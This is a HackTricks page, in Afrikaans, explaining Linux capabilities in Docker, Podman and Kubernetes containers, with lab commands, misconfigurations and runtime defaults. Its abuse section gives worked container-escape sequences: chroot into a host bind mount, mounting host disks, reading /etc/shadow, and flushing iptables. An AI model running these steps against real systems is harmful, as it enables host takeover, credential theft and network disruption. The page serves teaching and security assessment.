# Linux magte in kontainers

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

Linux-magte is een van die belangrikste dele van kontainer-sekuriteit omdat hulle 'n subtiele maar fundamentele vraag beantwoord: **wat beteken "root" regtig binne 'n kontainer?** Op 'n normale Linux-stelsel het UID 0 histories 'n baie breë stel bevoegdhede aangedui. In moderne kerne is daardie bevoegdheid opgesplit in kleiner eenhede wat magte genoem word. 'n Proses kan as root loop en steeds baie kragtige operasies mis as die relevante magte verwyder is.

Kontainers is baie afhanklik van hierdie onderskeid. Baie workloads word steeds as UID 0 binne die kontainer begin weens versoenbaarheid of eenvoud. Sonder die verwydering van magte sou dit veel te gevaarlik wees. Met die verwydering van magte kan 'n gekontaineriseerde root-proses steeds baie gewone take binne die kontainer uitvoer, terwyl meer sensitiewe kernoperasies geweier word. Daarom beteken 'n kontainer-shell wat `uid=0(root)` aandui nie outomaties "host root" of selfs 'n breë kernbevoegdheid nie. Die magtestelle bepaal hoeveel daardie root-identiteit werklik werd is.

Vir die volledige Linux-magte verwysing en baie misbruikvoorbeelde, sien:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Werking

Magte word in verskeie stelle opgevolg, insluitend permitted-, effective-, inheritable-, ambient- en bounding-stelle. Vir baie kontainer-beoordelings is die presiese kernel-semantiek van elke stel minder onmiddellik belangrik as die finale praktiese vraag: **watter bevoorregte operasies kan hierdie proses nou suksesvol uitvoer, en watter toekomstige verkryging van bevoegdhede is nog moontlik?**

Die rede waarom dit saak maak, is dat baie breakout techniques eintlik magte-probleme is wat as kontainer-probleme vermom is. 'n Workload met `CAP_SYS_ADMIN` kan toegang kry tot 'n groot hoeveelheid kernfunksionaliteit wat 'n normale kontainer-rootproses nie behoort aan te raak nie. 'n Workload met `CAP_NET_ADMIN` word veel meer gevaarlik as dit ook die host network namespace deel. 'n Workload met `CAP_SYS_PTRACE` word veel meer interessant as dit host-processes kan sien deur host PID sharing. In Docker of Podman kan dit verskyn as `--pid=host`; in Kubernetes verskyn dit gewoonlik as `hostPID: true`.

Met ander woorde kan die magtestel nie geïsoleerd geëvalueer word nie. Dit moet saam gelees word met namespaces, seccomp, en MAC-beleid.

## Lab

'n Baie direkte manier om magte binne 'n kontainer te ondersoek, is:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Jy kan ook 'n meer beperkende container vergelyk met een wat alle capabilities toegevoeg het:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Om die effek van 'n noue toevoeging te sien, probeer alles te verwyder en net een capability weer by te voeg:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Hierdie klein eksperimente help aantoon dat 'n runtime nie eenvoudig 'n boolean genaamd "privileged" omskakel nie. Dit vorm die werklike privilege-oppervlak wat vir die proses beskikbaar is.

## Hoog-risiko Capabilities

Alhoewel baie capabilities afhangende van die teiken belangrik kan wees, is 'n paar gereeld relevant in container escape analise.

**`CAP_SYS_ADMIN`** is die een wat defenders met die meeste agterdog behoort te behandel. Dit word dikwels beskryf as "the new root" omdat dit 'n enorme hoeveelheid funksionaliteit ontsluit, insluitend mount-verwante operasies, namespace-gevoelige gedrag, en baie kernel-paaie wat nooit skynbaar aan containers blootgestel behoort te word nie. As 'n container `CAP_SYS_ADMIN` het, swak seccomp, en geen sterk MAC confinement nie, raak baie klassieke breakout-paaie baie meer realisties.

**`CAP_SYS_PTRACE`** maak saak wanneer process visibility bestaan, veral as die PID namespace met die host of met interessante naburige workloads gedeel word. Dit kan visibility in tampering omskep.

**`CAP_NET_ADMIN`** en **`CAP_NET_RAW`** maak saak in netwerk-gefokusde omgewings. Op 'n geïsoleerde bridge network kan hulle reeds riskant wees; op 'n gedeelde host network namespace is hulle baie erger omdat die workload moontlik die host networking kan herkonfigureer, sniff, spoof, of die plaaslike verkeersvloei kan ontwrig.

**`CAP_SYS_MODULE`** is gewoonlik katastrofies in 'n rootful environment omdat die laai van kernel modules effektief host-kernel beheer beteken. Dit behoort bijna nooit in 'n algemene doel container workload voor te kom nie.

## Runtime Usage

Docker, Podman, containerd-based stacks, en CRI-O gebruik almal capability controls, maar die defaults en management interfaces verskil. Docker blootstel dit baie direk deur flags soos `--cap-drop` en `--cap-add`. Podman bied soortgelyke kontrole en baat dikwels by rootless execution as 'n addisionele veiligheidslaag. Kubernetes surface capability additions en drops deur die Pod of container `securityContext`. System-container omgewings soos LXC/Incus vertrou ook op capability control, maar die breër host-integrasie van daardie stelsels versoek operateurs dikwels om defaults meer aggressief te verslap as wat hulle in 'n app-container environment sou doen.

Dieselfde beginsel geld oor al hierdie: 'n capability wat tegnies moontlik is om toe te ken, is nie noodwendig een wat toegekend behoort te word nie. Baie real-world incidents begin wanneer 'n operator 'n capability byvoeg bloot omdat 'n workload onder 'n stringer konfiguratie misluk het en die span 'n vinnige oplossing nodig gehad het.

## Misconfigurations

Die mees voor die hand liggende fout is **`--cap-add=ALL`** in Docker/Podman-styl CLIs, maar dit is nie die enigste nie. In die praktyk is 'n meer algemene probleem die toeken van een of twee uiters kragtige capabilities, veral `CAP_SYS_ADMIN`, om "die application te laat werk" sonder om ook die namespace-, seccomp- en mount-implikasies te verstaan. 'n Ander algemene faalmodus is om ekstra capabilities te kombineer met host namespace sharing. In Docker of Podman kan dit verskyn as `--pid=host`, `--network=host`, of `--userns=host`; in Kubernetes verskyn die ekwivalente blootstelling gewoonlik deur workload-instellings soos `hostPID: true` of `hostNetwork: true`. Elk van daardie kombinasies verander wat die capability eintlik kan beïnvloed.

Dit kom ook gereeld voor dat administrateurs glo dat omdat 'n workload nie volledig `--privileged` is nie, dit steeds betekenisvol beperk is. Soms is dit waar, maar soms is die effektiewe houding reeds na aan privileged dat die onderskeid operationeel irrelevant raak.

## Misbruik

Die eerste praktiese stap is om die effektiewe capability set te enumereer en onmiddellik die capability-spesifieke aksies te toets wat saak sou maak vir escape of host information access:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
As `CAP_SYS_ADMIN` teenwoordig is, toets eers mount-gebaseerde misbruik en gasheer-lêerstelseltoegang, omdat dit een van die mees algemene breakout enablers is:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
As `CAP_SYS_PTRACE` teenwoordig is en die container interessante prosesse kan sien, verifieer of die bevoegdheid in prosesinspeksie omgeskakel kan word:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
As `CAP_NET_ADMIN` of `CAP_NET_RAW` teenwoordig is, toets of die werkbelasting die sigbare netwerkstapel kan manipuleer of ten minste nuttige netwerkintelligensie kan versamel:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wanneer 'n capability-toets slaag, kombineer dit met die namespace-situasie. ’n capability wat in ’n geïsoleerde namespace bloot riskant lyk, kan onmiddellik ’n escape- of host-recon-primitive word wanneer die container ook die host PID, host network, of host mounts deel.

### Volledige Voorbeeld: `CAP_SYS_ADMIN` + Host Mount = Host Escape

As die container `CAP_SYS_ADMIN` het en 'n writable bind mount van die host filesystem, soos `/host`, het, is die escape path dikwels reguit:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
As `chroot` slaag, word opdragte nou in die gasheer se root filesystem-konteks uitgevoer:
```bash
id
hostname
cat /etc/shadow | head
```
As `chroot` nie beskikbaar is nie, kan dieselfde resultaat dikwels bereik word deur die binary via die gemonteerde boom aan te roep:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Volledige Voorbeeld: `CAP_SYS_ADMIN` + Toesteltoegang

As 'n block device van die host blootgestel word, kan `CAP_SYS_ADMIN` dit omskep in direkte toegang tot die host se lêerstelsel:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Volledige voorbeeld: `CAP_NET_ADMIN` + Host Networking

Hierdie kombinasie gee nie altyd direk host root nie, maar dit kan die host se netwerkstapel volledig herkonfigureer:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dit kan denial of service, traffic interception, of toegang tot dienste moontlik maak wat voorheen gefilter was.

## Kontroles

Die doel van die capability checks is nie net om rou waardes te dump nie, maar om te verstaan of die proses genoeg voorregte het om sy huidige namespace- en mount-situasie gevaarlik te maak.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Wat hier interessant is:

- `capsh --print` is die maklikste manier om hoë-risiko capabilities op te spoor soos `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, of `cap_sys_module`.
- Die `CapEff`-reël in `/proc/self/status` vertel jou wat eintlik nou effektief is, nie net wat moontlik in ander stelle beskikbaar mag wees nie.
- 'n Capability-dump word veel belangriker as die container ook die host PID-, netwerk- of user-namespaces deel, of skryfbare host-mounts het.

Nadat jy die rou capability-inligting versamel het, is die volgende stap interpretasie. Vra of die proses root is, of user namespaces aktief is, of host namespaces gedeel word, of seccomp afdwing, en of AppArmor of SELinux die proses steeds beperk. 'n Capability-stel op sigself is net 'n deel van die storie, maar dit is dikwels die deel wat verduidelik hoekom een container breakout werk en 'n ander misluk met dieselfde skynbare beginpunt.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Verminderde standaardstel capabilities | Docker hou 'n standaard allowlist van capabilities en verwyder die res | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Verminderde standaardstel capabilities | Podman-containers is per verstek sonder voorregte en gebruik 'n verminderde capability-model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Erf runtime-standaarde tensy verander | As geen `securityContext.capabilities` gespesifiseer is nie, kry die container die standaard capability-stel van die runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Gewoonlik runtime-verstek | Die effektiewe stel hang af van die runtime plus die Pod-spes | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Vir Kubernetes is die belangrike punt dat die API nie een universele standaard capability-stel definieer nie. As die Pod nie capabilities byvoeg of verwyder nie, erf die werkbelasting die runtime-verstek vir daardie node.
{{#include ../../../../banners/hacktricks-training.md}}
